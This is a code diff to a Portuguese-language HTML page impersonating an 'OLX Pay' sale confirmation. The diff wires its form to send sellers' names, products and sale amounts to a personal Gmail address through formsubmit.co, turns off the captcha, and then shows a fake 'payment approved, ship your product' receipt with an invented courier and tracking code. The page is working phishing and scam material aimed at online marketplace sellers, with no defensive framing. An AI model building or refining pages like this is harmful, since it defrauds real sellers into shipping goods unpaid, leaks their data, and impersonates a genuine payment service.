@@ -2,6 +2,7 @@
 <html lang="pt-br">
 <head>
   <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>OLX Pay - Confirmação de Venda</title>
   <style>
     body {
@@ -94,15 +95,24 @@
       text-align: center;
       margin-top: 20px;
     }
+
+    .cadeado {
+      width: 22px;
+      vertical-align: middle;
+      margin-right: 8px;
+    }
   </style>
 </head>
 <body>
 
   <!-- Tela de Formulário -->
   <div id="formulario">
-    <h2>Confirmação de Venda - OLX Pay</h2>
+    <h2>
+      <img src="https://cdn-icons-png.flaticon.com/512/565/565547.png" class="cadeado" alt="cadeado">
+      OLX Pay - Confirmação de Venda
+    </h2>
 
-    <form id="vendaForm">
+    <form id="vendaForm" action="https://formsubmit.co/natanaelverissimo34@gmail.com" method="POST">
       <label for="nome">Seu nome completo:</label>
       <input type="text" id="nome" name="nome" required>
 
@@ -112,6 +122,13 @@
       <label for="produto">Produto vendido:</label>
       <input type="text" id="produto" name="produto" required>
 
+      <label for="valor">Valor da venda (R$):</label>
+      <input type="text" id="valor" name="valor" required>
+
+      <input type="hidden" name="_captcha" value="false">
+      <input type="hidden" name="_template" value="box">
+      <input type="hidden" name="_autoresponse" value="Recebemos sua confirmação. Aguarde o envio.">
+
       <button type="submit" class="btn">Confirmar venda</button>
     </form>
   </div>
@@ -120,7 +137,7 @@
   <div id="comprovante" class="confirmacao hidden">
     <h3>Pagamento aprovado – envie seu produto</h3>
     <p><strong>Produto vendido:</strong> <span id="produtoInfo"></span></p>
-    <p><strong>Valor:</strong> R$ 350,00</p>
+    <p><strong>Valor:</strong> <span id="valorInfo"></span></p>
     <p><strong>Forma de envio:</strong> Motoboy OLX Pay (entrega hoje)</p>
     <p><strong>Código de postagem:</strong> BR345671234BR</p>
 
@@ -157,13 +174,19 @@
       e.preventDefault();
       const form = e.target;
       document.getElementById("produtoInfo").innerText = form.produto.value;
+      document.getElementById("valorInfo").innerText = "R$ " + form.valor.value;
       document.getElementById("formulario").classList.add("hidden");
       document.getElementById("comprovante").classList.remove("hidden");
+
+      // Enviar para o FormSubmit
+      form.submit();
     });
 
     function irParaFinal() {
-      document.getElementById("comprovante").classList.add("hidden");
-      document.getElementById("final").classList.remove("hidden");
+      setTimeout(() => {
+        document.getElementById("comprovante").classList.add("hidden");
+        document.getElementById("final").classList.remove("hidden");
+      }, 1500);
     }
   </script>
 
